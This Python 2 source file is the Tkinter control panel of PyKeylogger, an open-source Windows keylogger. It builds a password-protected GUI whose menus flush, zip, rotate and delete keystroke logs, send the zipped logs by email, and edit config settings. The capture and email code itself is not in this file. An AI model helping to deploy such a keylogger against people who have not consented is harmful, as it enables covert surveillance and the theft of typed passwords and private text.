##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2007  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

from Tkinter import *
import mytkSimpleDialog # mytkSimpleDialog adds relative widnow placement configuration to tkSimpleDialog
import tkMessageBox
#import ConfigParser
from configobj import ConfigObj
from validate import Validator
from tooltip import ToolTip
import myutils
import webbrowser
from supportscreen import SupportScreen

class PyKeyloggerControlPanel:
	def __init__(self, cmdoptions, mainapp):
		self.cmdoptions=cmdoptions
		self.mainapp=mainapp
		self.panelsettings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)

		self.root = Tk()
		self.root.config(height=20, width=20)
		self.root.geometry("+200+200")
		self.root.protocol("WM_DELETE_WINDOW", self.ClosePanel)
		#self.root.iconify()
		#if self.panelsettings['General']['Master Password'] != "x\x9c\x03\x00\x00\x00\x00\x01":
		#	self.PasswordDialog()
		#print len(self.panelsettings['General']['Master Password'])
		#print zlib.decompress(self.panelsettings['General']['Master Password'])
		passcheck = self.PasswordDialog()
		
		# call the password authentication widget
		# if password match, then create the main panel
		if passcheck == 0:
			self.InitializeMainPanel()
			self.root.mainloop()
		elif passcheck == 1:
			self.ClosePanel()
		
	def InitializeMainPanel(self):
		#create the main panel window
		#root = Tk()
		#root.title("PyKeylogger Control Panel")
		# create a menu

		self.root.title("PyKeylogger Control Panel")
		self.root.config(height=200, width=200)
		
		menu = Menu(self.root)
		self.root.config(menu=menu)

		actionmenu = Menu(menu)
		menu.add_cascade(label="Actions", menu=actionmenu)
		actionmenu.add_command(label="Flush write buffers", command=Command(self.mainapp.lw.FlushLogWriteBuffers, "Flushing write buffers at command from control panel."))
		actionmenu.add_command(label="Zip Logs", command=Command(self.mainapp.lw.ZipLogFiles))
		actionmenu.add_command(label="Send logs by email", command=Command(self.mainapp.lw.SendZipByEmail))
		#actionmenu.add_command(label="Upload logs by FTP", command=self.callback) #do not have this method yet
		#actionmenu.add_command(label="Upload logs by SFTP", command=self.callback) # do not have this method yet
		actionmenu.add_command(label="Delete logs older than " + self.panelsettings['Log Maintenance']['Max Log Age'] + " days", command=Command(self.mainapp.lw.DeleteOldLogs))
		actionmenu.add_command(label="Rotate logfile", command=Command(self.mainapp.lw.RotateLogs))
		actionmenu.add_separator()
		actionmenu.add_command(label="Close Control Panel", command=self.ClosePanel)
		actionmenu.add_command(label="Quit PyKeylogger", command=self.mainapp.stop)

		optionsmenu = Menu(menu)
		menu.add_cascade(label="Configuration", menu=optionsmenu)
		for section in self.panelsettings.sections:
			optionsmenu.add_command(label=section + " Settings", command=Command(self.CreateConfigPanel, section))

		helpmenu = Menu(menu)
		menu.add_cascade(label="Help", menu=helpmenu)
		helpmenu.add_command(label="Manual [Web-based]", command=Command(webbrowser.open, "http://pykeylogger.sourceforge.net/wiki/index.php/PyKeylogger:Usage_Instructions"))
		helpmenu.add_command(label="About", command=Command(SupportScreen, self.root, title="Please Support PyKeylogger", rootx_offset=-20, rooty_offset=-35))

	def PasswordDialog(self):
		#passroot=Tk()
		#passroot.title("Enter Password")
		mypassword = mytkSimpleDialog.askstring("Enter Password", "Password:", show="*", rootx_offset=-20, rooty_offset=-35)
		if mypassword != myutils.password_recover(self.panelsettings['General']['Master Password']):
			if mypassword != None:
				tkMessageBox.showerror("Incorrect Password", "Incorrect Password")
			return 1
		else:
			return 0
			
	def ClosePanel(self):
		self.mainapp.panel = False
		self.root.destroy()
		
	def callback(self):
		tkMessageBox.showwarning(title="Not Implemented", message="This feature has not yet been implemented")
		
	def CreateConfigPanel(self, section):
		
		# reload the settings so that we are reading from the file, 
		# rather than from the potentially modified but not yet written out configobj
		del(self.panelsettings)
		self.panelsettings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
		
		self.configpanel = ConfigPanel(self.root, title=section + " Settings", settings=self.panelsettings, section=section)
		

class ConfigPanel(mytkSimpleDialog.Dialog):

	def __init__(self, parent, settings, section, title=None):
		self.settings=settings
		self.section=section
		mytkSimpleDialog.Dialog.__init__(self, parent, title)

	def body(self, master):
		
		index=0
		self.entrydict=dict()
		self.tooltipdict=dict()
		for key in self.settings[self.section].keys():
			if key.find("NoDisplay") == -1: #don't want to display settings that shouldn't be changed
				if key.find("Tooltip") == -1:
					Label(master, text=key).grid(row=index, sticky=W)
					self.entrydict[key]=Entry(master)
					if key.find("Password") == -1:
						self.entrydict[key].insert(END, self.settings[self.section][key])
					else:
						self.entrydict[key].insert(END, myutils.password_recover(self.settings[self.section][key]))
					self.entrydict[key].grid(row=index, column=1)
					self.tooltipdict[key] = ToolTip(self.entrydict[key], follow_mouse=1, delay=500, text=self.settings[self.section][key + " Tooltip"])
					index += 1
	
	def validate(self):
		
		for key in self.entrydict.keys():
			if key.find("Password") == -1:
				self.settings[self.section][key] = self.entrydict[key].get()
			else:
				self.settings[self.section][key] = myutils.password_obfuscate(self.entrydict[key].get())
		
		errortext="Some of your input contains errors. Detailed error output below.\n\n"
		
		val = Validator()
		valresult=self.settings.validate(val, preserve_errors=True)
		if valresult != True:
			if valresult.has_key(self.section):
				sectionval = valresult[self.section]
				for key in sectionval.keys():
					if sectionval[key] != True:
						errortext += "Error in item \"" + str(key) + "\": " + str(sectionval[key]) + "\n"
				tkMessageBox.showerror("Erroneous input. Please try again.", errortext)
			return 0
		else:
			return 1
	
	def apply(self):
		# this is where we write out the config file to disk
		self.settings.write()
		tkMessageBox.showinfo("Restart PyKeylogger", "You must restart PyKeylogger for the new settings to take effect.")

class Command:
	''' A class we can use to avoid using the tricky "Lambda" expression.
	"Python and Tkinter Programming" by John Grayson, introduces this
	idiom.
	
	Thanks to http://mail.python.org/pipermail/tutor/2001-April/004787.html
	for this tip.'''

	def __init__(self, func, *args, **kwargs):
		self.func = func
		self.args = args
		self.kwargs = kwargs

	def __call__(self):
		apply(self.func, self.args, self.kwargs)

if __name__ == '__main__':
	# some simple testing code
	settings={"bla":"mu", 'maxlogage': "2.0", "configfile":"practicepykeylogger.ini"}
	class BlankKeylogger:
		def stop(self):
			pass
		def __init__(self):
			self.lw=BlankLogWriter()
			
	class BlankLogWriter:
		def FlushLogWriteBuffers(self, message):
			pass
		def ZipLogFiles(self):
			pass
		def SendZipByEmail(self):
			pass
		def DeleteOldLogs(self):
			pass
	
	class BlankOptions:
		def __init__(self):
			self.configfile="pykeylogger.ini"
			self.configval="pykeylogger.val"
	
	klobject=BlankKeylogger()
	cmdoptions=BlankOptions()
	myapp = PyKeyloggerControlPanel(cmdoptions, klobject)